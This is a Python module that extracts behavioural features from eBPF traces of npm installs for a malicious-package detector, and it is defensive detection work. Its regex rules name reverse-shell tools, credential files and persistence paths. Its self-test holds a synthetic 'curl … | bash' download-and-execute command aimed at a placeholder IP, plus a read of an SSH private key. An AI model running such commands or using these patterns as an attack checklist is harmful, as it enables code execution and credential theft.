"""
Rich behavioral features for NPM traces captured with extended telemetry.

The current RQ1 traces only carry {type, pid, ppid, comm, fname, ts}. With
those fields, "malware compiling a native module" and "benign package
compiling a native module" produce the same event stream, which caps the
detector at ~90% F1. This module adds features for three extra signals the
capture side can emit. Every feature is 0 when its field is absent, so
old traces still work and a model trained with these features degrades
gracefully rather than crashing.

Required event fields (all optional per event):

  exec events
      "argv": ["curl", "-s", "http://x/y.sh"]      list of strings
      or "cmdline": "curl -s http://x/y.sh"       single string
      (eBPF: read args->argv[0..N] with bpf_probe_read_user_str in the
       sys_enter_execve tracepoint, N <= 16 is plenty)

  connect events
      "daddr": "1.2.3.4" | "2001:db8::1" | ""    destination address
      "dport": 443                                destination port (int)
      "family": "inet" | "inet6" | "unix"        socket family
      (eBPF: read the sockaddr at args->uservaddr; sa_family selects
       sockaddr_in / sockaddr_in6; ntohs(sin_port))

  any event
      "phase": "install" | "require"
      The collector runs `npm install <pkg>` (phase "install") and then
      `node -e "require('<pkg>')"` (phase "require") in the same trace,
      so payloads that only fire on import are captured too.

Usage: enable with `--rich` in train_npm_hybrid.py. A model's checkpoint
records whether it was trained with rich features; inference picks the
right feature set from the checkpoint's stat_dim automatically.
"""

import ipaddress
import math
import re
import shlex
from collections import Counter

# ------------------------------------------------------------------
# argv / command-line patterns
# ------------------------------------------------------------------

# Commands that belong to a legitimate native-module build. A package that
# only does these is not distinguishable from a benign build and should
# not be pushed towards "malicious" by the exec features.
BUILD_TOOLCHAIN = {
    "node-gyp", "node-pre-gyp", "prebuild-install", "prebuild", "make",
    "cmake", "gcc", "g++", "cc", "c++", "cc1", "cc1plus", "ld", "ar",
    "as", "ranlib", "pkg-config", "python", "python3", "x86_64-linux-gnu-gcc",
    "x86_64-linux-gnu-g++", "cargo", "rustc", "go", "tsc", "esbuild",
    "webpack", "rollup", "babel", "swc", "npm", "npx", "yarn", "pnpm",
    "node", "sh", "bash", "dash", "git",
}

# Substring / regex patterns over the joined command line. Each becomes one
# count feature (number of exec events whose command line matches).
CMDLINE_PATTERNS = [
    ("url",            re.compile(r"https?://", re.I)),
    ("ip_literal",     re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")),
    ("curl_wget",      re.compile(r"\b(curl|wget)\b", re.I)),
    ("pipe_to_shell",  re.compile(r"\|\s*(ba|z|da)?sh\b", re.I)),
    ("inline_script",  re.compile(r"\b(node|python3?|perl|ruby|php)\s+(-e|-c|-r)\b", re.I)),
    ("eval",           re.compile(r"\beval\s*\(", re.I)),
    ("base64",         re.compile(r"\bbase64\b|--decode|\b-d\b", re.I)),
    ("obfusc_hex",     re.compile(r"\\x[0-9a-f]{2}(?:\\x[0-9a-f]{2}){7,}", re.I)),
    ("chmod_exec",     re.compile(r"\bchmod\s+(\+x|[0-7]*7[0-7]*)", re.I)),
    ("reverse_shell",  re.compile(r"/dev/tcp/|\bnc\b.*\s-e\b|\bncat\b|\bsocat\b|\bmkfifo\b", re.I)),
    ("recon",          re.compile(r"\b(whoami|hostname|uname|id|ifconfig|ip\s+addr|env|printenv|"
                                  r"cat\s+/etc/(passwd|hosts|shadow)|ls\s+-la?\s+~|/proc/self/environ)\b", re.I)),
    ("credential",     re.compile(r"\.ssh/|\.aws/|\.npmrc|\.git-credentials|\.docker/config|"
                                  r"\.kube/config|\.env\b|id_rsa|token|secret", re.I)),
    ("persistence",    re.compile(r"\bcrontab\b|/etc/cron|systemctl\s+enable|\.bashrc|\.profile|"
                                  r"/etc/rc\.local|/etc/init\.d", re.I)),
    ("download_exec",  re.compile(r"(curl|wget).*(\||;|&&).*(sh|bash|node|python|chmod)", re.I)),
    ("dns_tool",       re.compile(r"\b(nslookup|dig|host)\b", re.I)),
    ("archive",        re.compile(r"\b(tar|unzip|gunzip|7z)\b", re.I)),
    ("hidden_path",    re.compile(r"(^|[\s/])\.[A-Za-z0-9_-]+/")),
    ("tmp_exec",       re.compile(r"(^|\s)/(tmp|var/tmp|dev/shm)/\S+", re.I)),
    ("sudo",           re.compile(r"\bsudo\b", re.I)),
    ("kill_ps",        re.compile(r"\b(kill|pkill|killall|ps\s+aux)\b", re.I)),
    ("npm_lifecycle",  re.compile(r"\bnpm\s+run\s+(build|prepare|install|postinstall|preinstall)\b", re.I)),
    ("gyp_build",      re.compile(r"\bnode-gyp\b|\bprebuild-install\b|\bnode-pre-gyp\b", re.I)),
]

# Destination ports that are unusual for an npm install.
WEB_PORTS = {80, 443, 8443}
DNS_PORTS = {53, 853}
SUSPICIOUS_PORTS = {21, 22, 23, 25, 1337, 4444, 4445, 5555, 6666, 6667, 8080, 8888, 9001, 9050, 31337}


def _argv_of(event):
    argv = event.get("argv")
    if isinstance(argv, list) and argv:
        return [str(a) for a in argv]
    cmd = event.get("cmdline")
    if isinstance(cmd, str) and cmd:
        try:
            return shlex.split(cmd)
        except ValueError:
            return cmd.split()
    return []


def _entropy(s):
    if not s:
        return 0.0
    c = Counter(s)
    n = len(s)
    return -sum(v / n * math.log2(v / n) for v in c.values())


def _classify_addr(addr):
    """-> 'loopback' | 'private' | 'public' | 'none'"""
    if not addr:
        return "none"
    try:
        ip = ipaddress.ip_address(addr)
    except ValueError:
        return "none"
    if ip.is_loopback:
        return "loopback"
    if ip.is_private or ip.is_link_local:
        return "private"
    return "public"


def trace_has_rich_fields(events):
    """True if any event carries at least one of the extended fields."""
    keys = {"argv", "cmdline", "daddr", "dport", "family", "phase"}
    return any(keys & set(e) for e in events)


# ------------------------------------------------------------------
# feature blocks
# ------------------------------------------------------------------

def _exec_features(events):
    f = []
    execs = [e for e in events if e.get("type") == "exec"]
    argvs = [_argv_of(e) for e in execs]
    argvs = [a for a in argvs if a]
    n = len(argvs)

    cmdlines = [" ".join(a) for a in argvs]
    for _, pat in CMDLINE_PATTERNS:
        k = sum(1 for c in cmdlines if pat.search(c))
        f.append(math.log1p(k))
        f.append(k / max(1, n))

    exes = [a[0].rsplit("/", 1)[-1] for a in argvs]
    n_build = sum(1 for x in exes if x in BUILD_TOOLCHAIN)
    n_other = n - n_build
    f.append(math.log1p(n_build))
    f.append(math.log1p(n_other))
    f.append(n_other / max(1, n))
    f.append(len(set(exes)))
    f.append(len(set(x for x in exes if x not in BUILD_TOOLCHAIN)))

    lens = [len(c) for c in cmdlines]
    toks = [len(a) for a in argvs]
    ents = [max((_entropy(t) for t in a), default=0.0) for a in argvs]
    long_tokens = sum(1 for a in argvs for t in a if len(t) > 100)
    f.append(math.log1p(max(lens, default=0)))
    f.append(math.log1p(sum(lens) / max(1, n)))
    f.append(max(toks, default=0))
    f.append(max(ents, default=0.0))
    f.append(math.log1p(long_tokens))
    f.append(float(n > 0))                       # argv telemetry present
    return f


def _connect_features(events):
    f = []
    cons = [e for e in events if e.get("type") == "connect"]
    with_addr = [e for e in cons if e.get("daddr") or e.get("dport") is not None]
    n = len(with_addr)

    kinds = Counter(_classify_addr(e.get("daddr", "")) for e in with_addr)
    fams = Counter(str(e.get("family", "")).lower() for e in with_addr)
    ports = [int(e["dport"]) for e in with_addr if e.get("dport") is not None]
    pc = Counter(ports)

    for k in ("loopback", "private", "public"):
        f.append(math.log1p(kinds.get(k, 0)))
        f.append(kinds.get(k, 0) / max(1, n))
    f.append(fams.get("unix", 0) / max(1, n))
    f.append(fams.get("inet6", 0) / max(1, n))

    n_web = sum(v for p, v in pc.items() if p in WEB_PORTS)
    n_dns = sum(v for p, v in pc.items() if p in DNS_PORTS)
    n_susp = sum(v for p, v in pc.items() if p in SUSPICIOUS_PORTS)
    n_high = sum(v for p, v in pc.items() if p >= 1024 and p not in WEB_PORTS | SUSPICIOUS_PORTS)
    for k in (n_web, n_dns, n_susp, n_high):
        f.append(math.log1p(k))
        f.append(k / max(1, n))

    pub_ips = set(e.get("daddr") for e in with_addr if _classify_addr(e.get("daddr", "")) == "public")
    f.append(math.log1p(len(pub_ips)))
    f.append(len(set(ports)))

    # public connects from processes other than npm's own network path,
    # or to non-web ports: the closest thing to "phones home" we can see
    npm_net = {"npm", "node", "libuv-worker", "git-remote-http", "sudo", "npm install /ho"}
    foreign = [e for e in with_addr
               if _classify_addr(e.get("daddr", "")) == "public"
               and (e.get("comm", "") not in npm_net
                    or (e.get("dport") is not None and int(e["dport"]) not in WEB_PORTS))]
    f.append(math.log1p(len(foreign)))
    f.append(len(set(e.get("daddr") for e in foreign)))
    f.append(float(n > 0))                       # address telemetry present
    return f


def _phase_features(events):
    f = []
    phased = [e for e in events if e.get("phase")]
    req = [e for e in phased if e.get("phase") == "require"]
    inst = [e for e in phased if e.get("phase") == "install"]
    n_req, n_inst = len(req), len(inst)

    f.append(math.log1p(n_req))
    f.append(n_req / max(1, n_req + n_inst))
    for t in ("exec", "open", "connect"):
        k = sum(1 for e in req if e.get("type") == t)
        f.append(math.log1p(k))
        f.append(k / max(1, n_req))

    inst_comms = set(e.get("comm", "") for e in inst)
    req_comms = set(e.get("comm", "") for e in req)
    f.append(len(req_comms - inst_comms))        # processes that appear only on require()

    # sensitive file access during require()
    sens = ("/etc/passwd", "/etc/shadow", ".ssh", ".aws", ".npmrc", ".env", "/proc/", ".gitconfig",
            ".bash_history", "/etc/hosts", "/etc/machine-id")
    k = sum(1 for e in req if e.get("type") == "open" and any(s in e.get("fname", "") for s in sens))
    f.append(math.log1p(k))
    f.append(float(n_req > 0))                   # require phase captured
    return f


def extract_rich_features(events):
    """Concatenated exec-argv, connect-destination and phase features."""
    return _exec_features(events) + _connect_features(events) + _phase_features(events)


RICH_FEATURE_DIM = len(extract_rich_features([]))

RICH_FEATURE_NAMES = (
    [f"exec:{name}:{k}" for name, _ in CMDLINE_PATTERNS for k in ("cnt", "ratio")]
    + ["exec:n_build", "exec:n_other", "exec:other_ratio", "exec:uniq_exe", "exec:uniq_nonbuild_exe",
       "exec:max_len", "exec:mean_len", "exec:max_tokens", "exec:max_entropy", "exec:long_tokens", "exec:present"]
    + [f"conn:{k}:{m}" for k in ("loopback", "private", "public") for m in ("cnt", "ratio")]
    + ["conn:unix_ratio", "conn:inet6_ratio"]
    + [f"conn:{k}:{m}" for k in ("web", "dns", "susp", "high") for m in ("cnt", "ratio")]
    + ["conn:uniq_public_ips", "conn:uniq_ports", "conn:foreign", "conn:foreign_ips", "conn:present"]
    + ["phase:req_events", "phase:req_ratio"]
    + [f"phase:req_{t}:{m}" for t in ("exec", "open", "connect") for m in ("cnt", "ratio")]
    + ["phase:req_only_comms", "phase:req_sensitive_open", "phase:present"]
)
assert len(RICH_FEATURE_NAMES) == RICH_FEATURE_DIM, (len(RICH_FEATURE_NAMES), RICH_FEATURE_DIM)


if __name__ == "__main__":
    # self-test on synthetic events
    legacy = [{"type": "open", "pid": 1, "ppid": 0, "comm": "npm", "fname": "/x", "ts": 1}]
    assert not trace_has_rich_fields(legacy)
    assert all(v == 0 for v in extract_rich_features(legacy))

    rich = [
        {"type": "exec", "pid": 2, "ppid": 1, "comm": "sh", "ts": 1, "phase": "install",
         "argv": ["sh", "-c", "curl -s http://1.2.3.4/p.sh | bash"]},
        {"type": "exec", "pid": 3, "ppid": 1, "comm": "node-gyp", "ts": 2, "phase": "install",
         "cmdline": "node-gyp rebuild"},
        {"type": "connect", "pid": 2, "ppid": 1, "comm": "curl", "ts": 3, "phase": "install",
         "daddr": "1.2.3.4", "dport": 4444, "family": "inet"},
        {"type": "connect", "pid": 1, "ppid": 0, "comm": "npm", "ts": 4, "phase": "install",
         "daddr": "104.16.0.1", "dport": 443, "family": "inet"},
        {"type": "open", "pid": 5, "ppid": 1, "comm": "node", "ts": 5, "phase": "require",
         "fname": "/home/u/.ssh/id_rsa"},
    ]
    assert trace_has_rich_fields(rich)
    vec = extract_rich_features(rich)
    named = dict(zip(RICH_FEATURE_NAMES, vec))
    assert named["exec:url:cnt"] > 0 and named["exec:pipe_to_shell:cnt"] > 0
    assert named["exec:gyp_build:cnt"] > 0 and named["exec:n_build"] > 0
    assert named["conn:susp:cnt"] > 0 and named["conn:foreign"] > 0
    assert named["phase:req_sensitive_open"] > 0 and named["phase:req_only_comms"] == 1
    print(f"OK - {RICH_FEATURE_DIM} rich features")
    for k, v in named.items():
        if v:
            print(f"  {k:32} {v:.3f}")
